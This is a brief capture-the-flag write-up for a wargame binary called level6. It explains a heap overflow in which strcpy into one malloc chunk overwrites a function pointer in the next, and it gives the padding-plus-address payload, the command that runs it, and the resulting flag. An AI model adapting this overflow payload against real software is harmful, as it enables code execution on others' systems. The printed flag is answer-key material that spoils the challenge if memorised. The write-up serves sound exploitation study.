## Analysis

The program calls malloc() twice. Then it does a strcpy() of the first arg and calls the function pointer saved into the second memory chunk.

`0x0804848c <+16>:    call   0x8048350 <malloc@plt>`
`0x08048491 <+21>:    mov    %eax,0x1c(%esp)`
`0x08048495 <+25>:    movl   $0x4,(%esp)`
`0x0804849c <+32>:    call   0x8048350 <malloc@plt>`

## Exploit

Memory corruption : memory chunks are sequentials, so we can override the following chunk with a user-provided address and then altercate the behavior of the program

## Crafting

0		      72	       76      0	     4
[RANDOM_PADDING_STRING][TARGET_NEW_ADDR]       [<N>_FUNCTION]
				|	       ^
				| func ptr()   |
				----------------

We provoke an overflow into the first chunck to overwrite the following one with the address of the <n> function instead of the <m> one.

## Shooting

python -c 'print "A"*72 + "\x54\x84\x04\x08"' | tr -d "\n" > /tmp/payload_level6
./level6 `cat /tmp/payload_level6`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
